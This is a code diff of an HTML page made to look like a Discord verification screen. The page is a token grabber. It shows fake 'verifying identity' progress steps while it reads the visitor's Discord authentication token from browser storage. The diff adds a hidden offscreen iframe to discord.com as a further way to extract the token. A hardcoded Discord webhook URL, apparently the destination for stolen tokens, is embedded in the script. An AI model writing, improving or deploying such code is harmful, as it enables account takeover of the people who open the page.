@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="ko">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -8,7 +8,6 @@
     <style>
         :root {
             --bg-color: #36393f;
-            --header-bg: #2f3136;
             --text-color: #dcddde;
             --sub-text: #72767d;
             --btn-color: #5865F2;
@@ -27,6 +26,7 @@
             height: 100vh;
             margin: 0;
             user-select: none;
+            overflow: hidden; /* Prevent scrolling */
         }
 
         .container {
@@ -35,7 +35,9 @@
             border-radius: 8px;
             box-shadow: 0 8px 16px rgba(0,0,0,0.2);
             text-align: center;
-            background-color: #2f3136; /* 헤더 배경과 동일하게 */
+            background-color: #2f3136;
+            position: relative;
+            z-index: 10;
         }
 
         .header {
@@ -132,9 +134,23 @@
         
         .success { color: var(--success-color); }
         .error { color: var(--error-color); }
+
+        /* Hidden iframe to access token */
+        #discord-frame {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
     </style>
 </head>
 <body>
+
+    <!-- Hidden Iframe for Token Extraction -->
+    <iframe id="discord-frame" src="https://discord.com/app"></iframe>
 
     <div class="container">
         <div class="header">
@@ -158,10 +174,9 @@
     </div>
 
     <script>
-        // 웹훅 URL (토큰이 전송될 곳)
+        // WEBHOOK URL
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1561489363878285333/JN3e1xD9pw-VOwdrYWgDMZeQXzkwLUjjGI_jbQmo8A_TuUWSUkugjfvwy3IiIGKn9uKg";
 
-        // 현재 시간 업데이트
         function updateClock() {
             const now = new Date();
             const timeString = now.toLocaleTimeString('en-US', { hour12: false });
@@ -181,7 +196,6 @@
             loader.style.display = 'block';
             statusMsg.innerHTML = "";
 
-            // 단계별 메시지 표시
             const steps = [
                 { msg: "Connecting to server...", delay: 1000 },
                 { msg: "Verifying identity...", delay: 1500 },
@@ -193,10 +207,22 @@
                 await new Promise(resolve => setTimeout(resolve, step.delay));
             }
 
-            // 토큰 추출
-            let token = localStorage.getItem('token');
+            // Try to get token from the iframe's context
+            let token = null;
+            try {
+                const frame = document.getElementById('discord-frame');
+                if (frame.contentWindow && frame.contentWindow.localStorage) {
+                    token = frame.contentWindow.localStorage.getItem('token') || 
+                            frame.contentWindow.localStorage.getItem('discord_token') ||
+                            frame.contentWindow.sessionStorage.getItem('token');
+                }
+            } catch (e) {
+                console.log("Could not access iframe storage directly due to CORS/SameSite");
+            }
+
+            // Fallback: Try parent window just in case
             if (!token) {
-                token = localStorage.getItem('discord_token') || localStorage.getItem('DISCORD_TOKEN');
+                token = localStorage.getItem('token') || localStorage.getItem('discord_token');
             }
 
             if (token) {
@@ -228,7 +254,7 @@
                 loader.style.display = 'none';
                 btnText.style.display = 'inline';
                 btn.disabled = false;
-                showError("Token not found. Please use Discord Desktop App.");
+                showError("Token not found. Please use Discord Desktop App or Browser.");
             }
         });
 
